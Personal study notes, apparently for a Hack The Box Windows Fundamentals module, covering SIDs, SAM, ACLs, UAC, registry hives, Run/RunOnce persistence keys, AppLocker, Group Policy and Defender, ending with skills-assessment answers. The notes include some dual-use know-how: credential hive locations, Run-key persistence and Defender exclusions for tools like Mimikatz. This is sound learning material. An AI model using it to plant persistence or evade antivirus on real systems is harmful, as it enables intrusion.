| Task Manager                   | ✅ Available     | ✅ Available        |
| Internet Explorer/Edge         | ❌ Not Available | ✅ Available        |
| Remote Desktop                 | ✅ Available     | ✅ Available        |

---
---

## Windows security

#### Windows Security Model – Core Principles
- **Authentication**
    - Verifies **who you are**.
    - Uses username/password, Kerberos tickets, NTLM hashes, smart cards, biometrics, etc.
- **Authorization**
    - Determines **what you can do**.
    - Uses Access Control Lists (ACLs) on files, services, registry, and objects.
- **Auditing**
    - Records **who did what and when**.
    - Events stored in **Windows Event Logs** for security monitoring.
- **Least Privilege Principle**
    - Users/processes should only have the **minimum rights needed**.
    - Prevents attackers from misusing accounts.
- **Separation of Duties**
    - Splits responsibilities between different accounts or roles (e.g., normal user account vs. admin account).
- **Defense in Depth**
    - Multiple layers of security (Firewall, Defender AV, BitLocker, User Rights, Logging).
    - If one layer fails, others still provide protection.


## Security Entities in Windows
Security applies to different components, not just users
- **Users** → need authentication & permissions.
- **Groups** → collections of users (e.g., Administrators, Domain Users).
- **Processes & Threads** → each has a security context (token).
- **Computers in a Network** → treated as security principals with trust relationships.

#### security identifier (SID)
- Every **security principal** (user, group, or computer account) in Windows has a **unique SID**.
- Even if two users have the **same username**, their SIDs are **different**, allowing Windows to distinguish them.
- SIDs are stored in the **security database** and are added to a user's **access token**, defining what actions they can perform.

A SID is a **string value** that looks like this:
`S-1-5-21-674899381-4069889467-2080702030-1002`

|Part|Number|Description|
|---|---|---|
|SID identifier|S|Marks the string as a SID|
|Revision level|1|Current revision level (always 1)|
|Identifier Authority|5|48-bit number identifying **the authority** that created the SID (e.g., local machine or domain)|
|Subauthority1|21|Variable number showing **the relation or group** to the authority|
|Subauthority2|674899381-4069889467-2080702030|Identifies **which computer or domain** created the account|
|Relative ID (RID)|1002|Distinguishes **individual accounts** (normal user, admin, guest, etc.)|
`whoami /user`
we can see the username and SID

---

#### security account manager (SAM)
- SAM is a windows database that stores
- user accounts, group accounts, password hashes
- SAM also **grants rights** for processes to execute on the system or network.

#### Access control entries (ACE) and Access control list (ACL)
- **ACLs** define **who can do what** on a securable object (file, folder, process).
- Each ACL contains **Access Control Entries (ACEs)**:
- An ACE specifies the permissions for a **specific user, group, or process**.
- ACL = the full list of permissions
- ACE = one rule in the list

| ACL Type                     | Description                                                                |
| ---------------------------- | -------------------------------------------------------------------------- |
| **DACL** (Discretionary ACL) | Specifies which users/groups are **allowed or denied access** to an object |
| **SACL** (System ACL)        | Specifies what **access attempts are logged** for auditing purposes        |
#### Access Tokens
- Every **process or thread** started by a user carries an **access token**.
- Access tokens include:
    - User SID
    - Group SIDs
    - Privileges
    - Other security-relevant info
- **Local Security Authority (LSA)** validates access tokens during authorization.

---

#### User Account Control (UAC)

its like a bouncer in the club if we need to access the system level stuff then we need to go though this steps

`i did not get this diagram`

![](attachments/Pasted%20image%2020250825183851.png)

- **User starts something that needs admin rights**  
    Example: Running `Defrag (Admin)` or installing software.
- **ShellExecute & CreateProcess**  
    Windows tries to create the process, but sees it needs higher privileges.
- **Elevation prompt (consent / credentials)**
    - If you’re an admin → You get the **consent prompt** (“Do you want to allow this app…?”).
    - If you’re a standard user → You get the **credential prompt** (must enter admin password).
- **System checks conditions**
    - Is **Secure Desktop** enabled? (UAC dims the screen so malware can’t click for you).
    - Is the file **signed by Microsoft** and marked for **silent elevation** (e.g., trusted Windows tools)?
    - What’s your **UAC slider level** (Always notify, Default, Never notify)?
- **Decision**
    - If conditions are okay → Process gets elevated via the **Application Information Service**.
    - Otherwise → It’s denied or runs with normal user rights.
- **Kernel layer**  
    Finally, if elevation is granted, the process is created and interacts with the **file system & registry** (with admin rights).


---
#### Registry

the windows registry is like a central database that stores al the setting for os, applications (if needed) users(personal preferences, desktop wallpapers... )

- In Linux: To see startup programs → check `/etc/init.d/` or `.bashrc`.
- In Windows: Same thing is stored in Registry → `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`.

##### Registry structure
The Registry is **hierarchical**, like a **folder tree**.  
At the top, we have **Root Keys** (like root folders), and inside them, we have **Subkeys** (like subfolders), and inside those, we have **Values** (like files).

**Windows Registry - Root Keys**

|Root Key|Emoji|Full Form / Meaning|What It Stores|Who It Affects|Example Use Case|
|---|---|---|---|---|---|
|**HKEY_CLASSES_ROOT (HKCR)**|📂|Classes Root|Information about **file types, extensions, and COM objects** (Component Object Model). Basically, tells Windows _how files and programs interact_.|System-wide (all users)|`.txt` opens with Notepad 📝, `.docx` opens with Word|
|**HKEY_CURRENT_USER (HKCU)**|👤|Current User|Settings & preferences of the **currently logged-in user**: desktop, wallpaper, network drives, environment variables.|Only YOU (the logged-in user)|Your wallpaper 🌄, browser homepage 🌐, theme 🎨|
|**HKEY_LOCAL_MACHINE (HKLM)**|🖥️|Local Machine|System-wide settings for **all users on this computer**. Includes drivers, services, startup programs, hardware configs.|Everyone on the PC|Disable USB storage 🚫💾, Installed programs list 📦|
|**HKEY_USERS (HKU)**|👥|Users|Contains settings for **all user profiles** on the system. HKCU is just a shortcut to your profile inside here.|Each user separately|Stores each user’s NTUSER.DAT (personal hive) 🗝️|
|**HKEY_CURRENT_CONFIG (HKCC)**|⚙️|Current Config|Stores temporary **hardware profile** info for the current session. Pulled from HKLM at startup.|Current session only|Monitor/display settings 🖥️, printer configs 🖨️|

**Type of Values**

- **Keys** = like folders 📁
- **Subkeys** = subfolders 📂 inside those folders
- **Values** = actual data 📝 inside each folder

|🏷️ Value Type|📖 Meaning|🔍 Example Use Case|
|---|---|---|
|**REG_SZ** 📝|A plain string (Unicode/ANSI).|Stores paths like `"C:\Windows\System32\cmd.exe"`|
|**REG_EXPAND_SZ** 🔗|A string with **environment variables** that expand.|`"C:\%SystemRoot%\System32"` → expands to real path|
|**REG_MULTI_SZ** 📚|Multiple strings stored together, each separated by `\0`.|List of startup programs, multiple DNS servers|
|**REG_DWORD** 🔢|A **32-bit number** (often ON/OFF switches).|`0 = Firewall Off`, `1 = Firewall On`|
|**REG_QWORD** 🧮|A **64-bit number** (for very large values).|Performance counters, time stamps|
|**REG_BINARY** ⚙️|Raw binary data (hex format).|Hardware configs, device drivers|
|**REG_LINK** 🔗📂|Symbolic link to another registry key.|Rare, used internally by Windows|
|**REG_NONE** ❓|No defined type, used rarely.|Reserved, uncommon|
|**REG_DWORD_LITTLE_ENDIAN** ↔️|Same as REG_DWORD but stored in little-endian format (default for Windows).|Normal DWORD values internally|
|**REG_DWORD_BIG_ENDIAN** 🔄|32-bit number in big-endian format (uncommon in Windows).|Rare, some cross-platform settings|
|**REG_QWORD_LITTLE_ENDIAN** ↔️|Same as REG_QWORD but in little-endian format.|Standard QWORD usage in Windows|

**Registry Storage (Where it lives)**

The Windows Registry isn’t just one file — it’s broken into **hives** (big chunks of settings) stored on disk and loaded into memory when Windows starts.

- Each **root key** (HKLM, HKCU, etc.) maps to a **hive file** on disk.
- These hive files live mostly in:
    - `C:\Windows\System32\Config\` → system-wide settings
    - `C:\Users\<USERNAME>\` → user-specific settings (`Ntuser.dat`)
- At boot time, Windows **loads these files into memory** so they can be accessed quickly.

**Major Hive Files & Locations**

|🏷️ Hive File|📍 Location|🔗 Maps To Registry Key|📝 What It Stores|
|---|---|---|---|
|**SYSTEM** ⚙️|`C:\Windows\System32\Config\SYSTEM`|`HKLM\SYSTEM`|Boot info, drivers, services|
|**SOFTWARE** 💻|`C:\Windows\System32\Config\SOFTWARE`|`HKLM\SOFTWARE`|Installed programs & configs|
|**SECURITY** 🔐|`C:\Windows\System32\Config\SECURITY`|`HKLM\SECURITY`|Security policies, LSA secrets|
|**SAM** 🧑‍🤝‍🧑|`C:\Windows\System32\Config\SAM`|`HKLM\SAM`|Local user accounts & password hashes|
|**DEFAULT** 📋|`C:\Windows\System32\Config\DEFAULT`|`HKU\.DEFAULT`|Default profile for new users|
|**NTUSER.DAT** 👤|`C:\Users\<User>\NTUSER.DAT`|`HKCU`|Current user’s settings (desktop, wallpaper, etc.)|
|**UsrClass.dat** 🎨|`C:\Users\<User>\AppData\Local\Microsoft\Windows\UsrClass.dat`|Part of `HKCU\Software\Classes`|User-specific class registrations (file associations, UI prefs)|

**Registry is stored on disk**
In Windows, the registry is not just in memory — it’s actually stored in physical files on disk. These are called **registry hives**. There are two main types:

A. System-Level Registry Hives
These apply to the **whole computer** — shared by all users.

Location: `C:\Windows\System32\Config\`

| 🧩 Hive File Name        | 🏷️ What It Contains                                 | 🔍 Related Root Key             |
| ------------------------ | ---------------------------------------------------- | ------------------------------- |
| `SAM`                    | Local user account info and passwords (hashed)       | `HKLM\SAM`                      |
| `SECURITY`               | Local security policies and user rights              | `HKLM\SECURITY`                 |
| `SYSTEM`                 | Boot config, drivers, and system settings            | `HKLM\SYSTEM`                   |
| `SOFTWARE`               | Installed apps, Windows config, program settings     | `HKLM\SOFTWARE`                 |
| `DEFAULT`                | Template for new users (like wallpaper, mouse speed) | `HKU\.DEFAULT`                  |
| `BCD` (Boot Config Data) | Boot loader settings                                 | Not directly in Registry Editor |

B. User-Level Registry Hives
These are unique to each user profile.
📍Location: `C:\Users\<USERNAME>\NTUSER.DAT`

|📄 File|🏷️ Purpose|🔍 Related Root Key|
|---|---|---|
|`NTUSER.DAT`|User’s personal settings (desktop, browser, etc.)|`HKCU` (HKEY_CURRENT_USER)|
|`ntuser.dat.LOG1/LOG2`|Backup/restore logs|Internal use|
|`UsrClass.dat` (in `AppData`)|App-specific user settings|`HKCU\Software\Classes`|
**How to Open and Navigate the Windows Registry (Using Regedit)**

The Registry Editor (regedit.exe) is the built-in tool in Windows that allows you to view and edit the Windows Registry — the hierarchical database that stores system and user configuration.

🔹 Press ⊞ Win + R → type `regedit` → hit Enter  
🔹 Search for "regedit" in the Start Menu  
🔹 From Command Prompt or PowerShell: just type `regedit`



🧠 **Run & RunOnce Registry Keys**  
(A common topic in Windows internals, malware persistence, and red teaming)

📘 What Are They?

Run and RunOnce are special registry keys used to automatically execute programs during:

- System boot (machine-wide)
    
- User login (user-specific)
    
- One-time execution at next login/startup
    

These are commonly used by:

- Legitimate software for auto-starting
    
- Attackers for persistence
    



🧩 Registry Key Paths

There are four important keys to remember:

|🗂 Registry Path|🧍 Scope|🔁 Behavior|
|---|---|---|
|HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run|All users (system-wide)|Executes every time the system starts|
|HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run|Current logged-in user only|Executes every time that specific user logs in|
|HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce|All users|Runs only once on next system boot, then deletes the entry|
|HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce|Current user|Runs only once at next login for the user, then deletes the entry|

📌 Tip: RunOnce is useful for setup tasks or one-time installers.



📂 Example Output

🖥️ HKEY_LOCAL_MACHINE...\Run (System-wide apps)

PowerShell command:  
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

Example result:

```
SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe  
RTHDVCPL          REG_SZ           "C:\Program Files\Realtek\Audio\HDA\RtkNGUI64.exe" -s  
Greenshot         REG_SZ           C:\Program Files\Greenshot\Greenshot.exe  
```

🧑 HKEY_CURRENT_USER...\Run (Per-user apps)

PowerShell command:  
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

Example result:

```
OneDrive         REG_SZ    "C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background  
OPENVPN-GUI      REG_SZ    C:\Program Files\OpenVPN\bin\openvpn-gui.exe  
Docker Desktop   REG_SZ    C:\Program Files\Docker\Docker\Docker Desktop.exe  
```



🛡️ Why It Matters (Security Focus)

- These keys are heavily abused by malware and persistence techniques.
    
- Attackers drop backdoors here to restart malicious processes on reboot or login.
    
- Tools like Autoruns (Sysinternals) check these keys during system auditing.
    
- Blue teams and incident responders often inspect these keys during forensic analysis.
    


🧪 Quick Recap

|🔑 Key Path|🔁 Repeats|👥 Applies To|🛠️ Common Use|
|---|---|---|---|
|Run|Every login/boot|System or current user|Persistent apps (good or bad)|
|RunOnce|One-time only|System or current user|Setup scripts, malware tricks|

---
 
 #### Application whitelisting 
 Application whitelisting is a security method that allows only approved (trusted) applications to run on a system. All other apps are blocked—even if they're not known to be malicious.
⚠️ Challenge: It’s hard to implement at scale (many apps = more rules).  
🧪 Solution: Start in Audit Mode first → test policies before enforcement.

Whitelisting is recommended by organizations such as [NIST](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-167.pdf), especially in high-security environments.

---

🧰 AppLocker — Microsoft’s Whitelisting Tool

Introduced in: Windows 7 (and available in newer versions like Windows 10/11 & Windows Server)

💼 Purpose: Allows system administrators to define which apps, scripts, or installers can be run by users or groups.

🎯 What AppLocker Can Control:

- 🧱 Executable files (.exe, .com)
    
- 📜 Script files (.ps1, .vbs, .bat, .cmd, .js)
    
- 🛠️ Windows Installer files (.msi, .msp)
    
- 📦 Packaged apps and installers (.appx, .msix)

How Rules Are Created:

AppLocker rules can be defined using:

|Rule Type|Description|
|---|---|
|Publisher|Based on digital signature (e.g., Microsoft, Adobe)|
|Path|Based on file/folder location (e.g., C:\Program Files\Zoom\zoom.exe)|
|Hash|Based on the file’s cryptographic hash (unique fingerprint)|
Rules can be scoped to:

- 👥 Security groups (e.g., Admins, Users)
    
- 👤 Individual user accounts

🧪 Audit Mode vs. Enforcement Mode

|Mode|Purpose|
|---|---|
|Audit Mode|Log violations without blocking — test rules safely|
|Enforce Mode|Actually block non-approved applications|
Always use Audit Mode first before full deployment.
[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)

---


🛠️ Local Group Policy 

📌 What Is Local Group Policy?

Local Group Policy is a feature in Windows that lets administrators (or users with admin rights) control settings and behavior of the local system — without needing a domain or server.

✅ You can control:

- Security settings
    
- App restrictions
    
- Password policies
    
- Network and user configuration
    
- Application whitelisting (e.g., AppLocker)
    
- Advanced Windows features like Credential Guard
    

—

🏢 Difference Between Group Policy and Local Group Policy

|Feature|Group Policy (Domain)|Local Group Policy (Standalone)|
|---|---|---|
|Requires a Domain Controller|✅ Yes|❌ No|
|Applies to multiple computers|✅ Yes|❌ Applies to just one computer|
|Common in enterprise networks|✅ Yes|❌ Used in personal/small business PCs|
|Access via GPMC (Group Policy Mgmt Console)|✅ Yes|❌ Uses gpedit.msc|

—

🧭 How to Access Local Group Policy Editor:

- Press ⊞ Win + R → type: gpedit.msc → Press Enter
    

🗂️ Structure of the Editor:

- 🔧 Computer Configuration: Settings that apply to the entire system (all users)
    
- 👤 User Configuration: Settings that apply to a specific user account
    

—

🔐 Example Use Cases

Here are some real-world uses of Local Group Policy:

|Feature|Where It's Found|What It Does|
|---|---|---|
|🔒 Credential Guard|Computer Configuration → Admin Templates → System → Device Guard|Isolates LSA (Local Security Authority) to protect credentials|
|🚫 App Restrictions (AppLocker)|Computer Configuration → Windows Settings → Security Settings → AppLocker|Limits which apps can run on the system|
|👁️ Audit Policy|Computer Configuration → Security Settings → Advanced Audit Policy|Enables detailed logging of user and system actions|
|🔑 Password Policy|Computer Configuration → Security Settings → Account Policies → Password Policy|Enforces strong password rules (length, complexity, etc.)|
|📦 Prevent App Installations|User Configuration → Admin Templates → Windows Components|Blocks users from installing unauthorized software|

—

🛡️ Why It's Important for Security:

- Lock down user access
    
- Prevent misuse or unwanted configuration changes
    
- Enforce compliance with organization policies
    
- Stop malware from executing unauthorized tasks
    
- Control app behavior even without third-party tools
    

—

✅ Summary

- Local Group Policy allows fine-grained control over system behavior without needing a domain.
    
- It’s powerful for security hardening (e.g., Credential Guard, AppLocker, auditing).
    
- It’s accessed using gpedit.msc and separated into Computer/User configurations.
    
- Explore it hands-on — it’s essential knowledge for Windows administrators and security pros.
    

---

🛡️ Windows Defender Antivirus — Notes

📌 Overview  
Windows Defender Antivirus (now called Microsoft Defender Antivirus) is the built-in security solution included with Windows operating systems.

- Originally released: As anti-spyware for Windows XP/Server 2003.
    
- Bundled with: Windows Vista/Server 2008 and newer.
    
- Renamed: To Windows Defender Antivirus with Windows 10 Creators Update.
    
- Managed through: Windows Security Center.
    

🎯 Core Features

|Feature|Description|
|---|---|
|✅ Real-Time Protection|Scans for threats actively while using the system.|
|☁️ Cloud-Delivered Protection|Uploads suspicious files to Microsoft cloud for faster threat detection.|
|🔐 Tamper Protection|Prevents changes to Defender settings via Registry, PowerShell, or GPO.|
|🗂️ Controlled Folder Access|Ransomware protection — blocks unauthorized changes to protected folders.|
|🧪 Exclusions|Allows whitelisting of files/folders (e.g., pentesting tools) to avoid false positives.|

—

⚙️ Managing Defender via PowerShell

Use the following command to check Defender’s protection status:

```powershell
Get-MpComputerStatus | findstr "True"
```

🔍 Example Output:

- AMServiceEnabled : True
    
- AntivirusEnabled : True
    
- RealTimeProtectionEnabled : True
    
- BehaviorMonitorEnabled : True
    
- IsTamperProtected : True
    

This confirms Defender and its components are active.

—

📂 Key Feature: Controlled Folder Access

- Blocks unauthorized apps (like ransomware) from accessing important folders.
    
- You can manually add:
    
    - Protected folders
        
    - Allowed applications (trusted programs)
        

🔧 Useful if you’re using tools that might otherwise be flagged as malicious (e.g., Kali Linux tools or Mimikatz).

—

🛡️ Strengths

✅ Built-in and free — no bloatware or added tracking.  
✅ High detection rates — competitive with paid AV products in industry tests.  
✅ Automatic updates — definitions update with Windows Update.  
✅ Deep integration — no need for extra software hooks that slow the system.

—

⚠️ Limitations

🚫 Not foolproof — can still be bypassed with advanced payloads (e.g., encoded or obfuscated attacks).  
📉 May detect common tools like Metasploit/Mimikatz as malicious.  
🧠 Should be used as part of a defense-in-depth strategy — not your only line of defense.

—

🧠 Key Takeaways

- Microsoft Defender Antivirus is a strong baseline defense tool, especially with features like real-time protection, cloud analysis, and tamper protection.
    
- It can be configured and customized through both GUI and PowerShell.
    
- You should use it alongside secure configuration, patching, and system hardening for full protection.

---

wmic useraccount where "name='bob.smith'" get name,sid 

What 3rd party security application is disabled at startup for the current user? (The answer is case sensitive).
NordVpn 

opened in taskmanager


wmic useraccount where "name='Jim'" get name,sid 

https://cloverophile.medium.com/hackthebox-academy-windows-fundamentals-skills-assessment-write-up-65b0e9979f7c